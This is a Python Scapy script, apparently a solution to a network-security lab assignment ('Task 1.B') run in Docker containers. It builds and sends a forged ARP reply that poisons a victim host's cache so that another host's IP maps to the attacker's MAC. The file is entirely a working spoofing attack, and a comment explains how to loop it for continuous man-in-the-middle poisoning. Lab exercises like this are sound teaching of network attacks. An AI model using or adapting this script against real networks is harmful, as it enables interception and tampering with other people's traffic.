#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp
import time

# --- Configuration ---
IP_A_TARGET = "10.9.0.5"         # Host A's IP (the victim)
MAC_A_TARGET = "02:42:0a:09:00:05" # Host A's MAC

IP_B_SPOOFED = "10.9.0.6"        # Host B's IP (the IP we are claiming to be)
# This should be the MAC address of your attacker machine (Host M)
# Ensure this is correct for your Host M container.
# You can find it using 'ip link show eth0' (or appropriate interface) on Host M,
# or it might be defined in your docker-compose.yml if static.
# The example MAC "02:42:0a:09:00:69" was provided in the prompt.
MAC_M_ATTACKER = "02:42:0a:09:00:69"

def send_arp_reply():
    """
    Constructs and sends a single ARP reply packet to poison Host A's cache.
    Host A will be told that IP_B_SPOOFED is at MAC_M_ATTACKER.
    """
    print(f"[*] Sending ARP Reply to {IP_A_TARGET} ({MAC_A_TARGET})")
    print(f"[*] Spoofing: {IP_B_SPOOFED} is at {MAC_M_ATTACKER}")

    # Construct the Ethernet Frame
    # Destination MAC: Host A's MAC address
    # Source MAC: Attacker's (Host M's) MAC address
    ether_frame = Ether(dst=MAC_A_TARGET, src=MAC_M_ATTACKER)

    # Construct the ARP Packet
    # op=2 specifies an ARP reply
    # hwsrc (Source MAC): Attacker's MAC address (MAC_M_ATTACKER)
    # psrc (Source IP): The IP address the attacker is pretending to be (IP_B_SPOOFED)
    # hwdst (Target MAC): Victim's MAC address (MAC_A_TARGET)
    # pdst (Target IP): Victim's IP address (IP_A_TARGET)
    arp_packet = ARP(op=2, # ARP Reply
                      hwsrc=MAC_M_ATTACKER,
                      psrc=IP_B_SPOOFED,
                      hwdst=MAC_A_TARGET,
                      pdst=IP_A_TARGET)

    # Combine the Ethernet frame and ARP packet
    packet = ether_frame / arp_packet

    # Send the packet at Layer 2
    # verbose=False to suppress Scapy's default output for sent packets
    try:
        sendp(packet, verbose=False)
        print("[+] ARP Reply packet sent successfully.")
    except Exception as e:
        print(f"[!] Error sending packet: {e}")

if __name__ == "__main__":
    # This script will send one ARP reply packet.
    # For continuous poisoning (as often needed in MITM attacks),
    # you would typically put send_arp_reply() in a loop with a delay.
    # For Task 1.B, sending it once should be sufficient to observe the cache change.

    print("--- ARP Poisoning Script (Task 1.B - ARP Reply) ---")
    send_arp_reply()
    print("\\n--- Verification ---")
    print(f"On Host A ({IP_A_TARGET}), run the command: arp -n")
    print(f"Check if the MAC address for {IP_B_SPOOFED} is now {MAC_M_ATTACKER}.")
    print("\\nRemember to test this under two scenarios as per the assignment:")
    print("1. B's IP is already in A's cache.")
    print("2. B's IP is NOT in A's cache (use 'arp -d <IP_B_SPOOFED>' on Host A first).")

